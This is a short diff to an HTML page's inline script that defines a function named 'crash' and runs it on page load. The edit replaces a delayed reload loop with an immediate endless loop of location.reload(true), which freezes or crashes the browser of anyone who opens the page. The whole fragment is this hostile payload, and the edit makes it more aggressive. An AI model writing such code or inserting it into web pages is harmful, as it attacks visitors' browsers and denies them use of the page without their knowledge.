@@ -31,12 +31,13 @@
 
   <script>
     function crash() {
-      setTimeout(function() {
-        while (1) location.reload(1);
-      }, 1);
+      // Immediately start reloading in an infinite loop
+      while (true) {
+        location.reload(true);
+      }
     }
 
-    // Run crash on page load
+    // Run crash right away
     window.onload = crash;
   </script>
 
